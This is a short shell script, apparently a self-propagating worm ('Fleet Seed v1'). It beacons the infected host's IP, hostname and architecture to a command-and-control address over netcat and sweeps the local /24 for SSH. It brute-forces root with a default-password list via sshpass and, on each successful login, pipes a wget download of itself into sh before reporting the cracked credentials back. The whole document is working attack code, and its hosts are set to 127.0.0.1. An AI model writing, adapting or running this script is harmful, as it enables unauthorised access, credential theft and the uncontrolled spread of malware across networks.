#!/bin/sh
# Fleet Seed v1 — busybox-compatible worm bootstrap
C2_HOST="127.0.0.1"
C2_PORT="10001"
MY_IP=$(ifconfig 2>/dev/null | grep 'inet ' | head -1 | awk '{print $2}')
[ -z "$MY_IP" ] && MY_IP=$(hostname -i 2>/dev/null)
echo "FLEETOK:$MY_IP:$(hostname):$(uname -m)" | nc $C2_HOST $C2_PORT -w 5 2>/dev/null
# Scan local /24 for SSH
for i in $(seq 1 254); do
  TARGET="$(echo $MY_IP | cut -d'.' -f1-3).$i"
  [ "$TARGET" = "$MY_IP" ] && continue
  timeout 2 sh -c "echo >/dev/tcp/$TARGET/22" 2>/dev/null || continue
  for PASS in admin 1234 root pass 123456 12345 default; do
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
      root@$TARGET "echo PROPAGATE:$TARGET:$PASS; wget -q -O - http://127.0.0.1:10004/fleet_seed.sh | sh" \
      >/dev/null 2>&1 && {
      echo "PWNED:$TARGET:$PASS" | nc $C2_HOST $C2_PORT -w 3 2>/dev/null
      break
    }
  done
done
